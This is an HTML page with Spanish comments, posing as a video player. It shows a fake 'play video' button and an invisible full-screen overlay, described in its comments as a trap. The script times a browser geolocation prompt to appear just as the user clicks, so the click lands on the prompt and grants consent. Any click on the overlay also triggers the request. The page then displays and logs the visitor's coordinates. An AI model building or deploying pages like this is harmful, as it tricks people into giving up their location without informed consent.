<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #000;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        .container {
            text-align: center;
            position: relative;
            width: 100%;
            max-width: 400px;
        }

        /* Botón falso principal */
        .fake-btn {
            background-color: #ff0000;
            color: white;
            padding: 20px 40px;
            font-size: 24px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            z-index: 10;
            position: relative;
            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
        }

        /* Capa invisible que cubre todo */
        #overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 9999;
            cursor: pointer;
        }

        #status {
            margin-top: 20px;
            font-size: 14px;
            color: #ccc;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Paso 1: El botón que parece real -->
        <button class="fake-btn" id="btn1">▶ Reproducir Video</button>
        <div id="status"></div>
    </div>

    <!-- Paso 2: La trampa invisible -->
    <div id="overlay"></div>

    <script>
        const btn1 = document.getElementById('btn1');
        const overlay = document.getElementById('overlay');
        const statusDiv = document.getElementById('status');
        let firstClick = true; // Variable de estado

        function askPermission() {
            if (!("geolocation" in navigator)) {
                statusDiv.innerText = "Geolocalización no disponible.";
                return;
            }

            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    statusDiv.innerHTML = `✅ Ubicación obtenida:<br><b>${lat}, ${lng}</b>`;
                    console.log(`Lat: ${lat}, Lng: ${lng}`);
                },
                (error) => {
                    statusDiv.innerText = "Permiso denegado o error.";
                }
            );
        }

        // Evento 1: El usuario pulsa el botón rojo
        btn1.addEventListener('click', () => {
            if (firstClick) {
                // Simulamos que el video está cargando
                statusDiv.innerText = "Cargando video...";
                
                // Lanzamos el aviso del navegador justo cuando el usuario espera ver el video
                setTimeout(() => {
                    askPermission();
                }, 500); // 500ms es suficiente para que el cerebro reaccite tarde
            } else {
                // Si ya pasó por aquí antes, mostramos el mensaje final
                statusDiv.innerText = "Video listo.";
            }
        });

        // Evento 2: El usuario hace clic en cualquier lado (la trampa)
        overlay.addEventListener('click', () => {
            if (firstClick) {
                // Esto captura el clic "inercial" sobre el aviso del navegador
                askPermission();
            }
        });
    </script>
</body>
</html>
